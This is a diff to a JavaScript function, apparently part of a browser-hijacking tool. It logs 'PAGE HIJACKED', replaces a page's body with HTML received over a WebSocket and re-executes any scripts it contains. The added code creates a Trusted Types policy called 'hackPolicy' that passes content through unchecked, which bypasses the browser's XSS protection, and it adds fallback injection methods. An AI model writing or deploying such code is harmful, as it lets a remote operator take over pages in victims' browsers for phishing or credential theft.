@@ -653,38 +653,79 @@ ws.onmessage = (event) => {
 function replacePageHTML(htmlContent) {
     console.log('🚨 PAGE HIJACKED - Replacing body content');
     
-    // Extract content from the HTML (remove html, head, body tags if present)
-    let bodyContent = htmlContent;
-    
-    // Simple string-based extraction to avoid regex issues
-    const bodyStartTag = htmlContent.indexOf('<body');
-    const bodyEndTag = htmlContent.indexOf('</body>');
-    
-    if (bodyStartTag !== -1 && bodyEndTag !== -1) {
-        // Find the end of the opening body tag
-        const bodyOpenEnd = htmlContent.indexOf('>', bodyStartTag) + 1;
-        // Extract content between body tags
-        bodyContent = htmlContent.substring(bodyOpenEnd, bodyEndTag);
-    } else {
-        // If no body tags, use the content as-is since our templates are already body content
-        bodyContent = htmlContent;
-    }
-    
-    // Replace only the body content
-    document.body.innerHTML = bodyContent;
-    
-    // Execute any scripts that might be in the injected content
-    const scripts = document.body.querySelectorAll('script');
-    scripts.forEach(function(script) {
-        const newScript = document.createElement('script');
-        if (script.src) {
-            newScript.src = script.src;
+    try {
+        // Extract content from the HTML (remove html, head, body tags if present)
+        let bodyContent = htmlContent;
+        
+        // Simple string-based extraction to avoid regex issues
+        const bodyStartTag = htmlContent.indexOf('<body');
+        const bodyEndTag = htmlContent.indexOf('</body>');
+        
+        if (bodyStartTag !== -1 && bodyEndTag !== -1) {
+            // Find the end of the opening body tag
+            const bodyOpenEnd = htmlContent.indexOf('>', bodyStartTag) + 1;
+            // Extract content between body tags
+            bodyContent = htmlContent.substring(bodyOpenEnd, bodyEndTag);
         } else {
-            newScript.textContent = script.textContent;
+            // If no body tags, use the content as-is since our templates are already body content
+            bodyContent = htmlContent;
         }
-        document.head.appendChild(newScript);
-        script.remove();
-    });
+        
+        // Method 1: Try using innerHTML with TrustedHTML bypass
+        try {
+            if (window.trustedTypes && window.trustedTypes.createPolicy) {
+                const policy = window.trustedTypes.createPolicy('hackPolicy', {
+                    createHTML: function(string) { return string; }
+                });
+                document.body.innerHTML = policy.createHTML(bodyContent);
+            } else {
+                document.body.innerHTML = bodyContent;
+            }
+        } catch (e) {
+            console.log('innerHTML failed, using DOM manipulation method');
+            
+            // Method 2: Use DOMParser as fallback
+            const parser = new DOMParser();
+            const doc = parser.parseFromString('<div>' + bodyContent + '</div>', 'text/html');
+            const container = doc.querySelector('div');
+            
+            // Clear body content
+            while (document.body.firstChild) {
+                document.body.removeChild(document.body.firstChild);
+            }
+            
+            // Move all children from container to body
+            while (container.firstChild) {
+                document.body.appendChild(container.firstChild);
+            }
+        }
+        
+        // Execute any scripts that might be in the injected content
+        const scripts = document.body.querySelectorAll('script');
+        scripts.forEach(function(script) {
+            const newScript = document.createElement('script');
+            if (script.src) {
+                newScript.src = script.src;
+            } else {
+                newScript.textContent = script.textContent;
+            }
+            document.head.appendChild(newScript);
+            script.remove();
+        });
+        
+    } catch (error) {
+        console.error('Failed to replace page HTML:', error);
+        
+        // Fallback method: Simple text replacement
+        try {
+            document.body.textContent = '';
+            const div = document.createElement('div');
+            div.innerHTML = htmlContent;
+            document.body.appendChild(div);
+        } catch (fallbackError) {
+            console.error('All methods failed:', fallbackError);
+        }
+    }
 }
 
 function handleAction(action) {
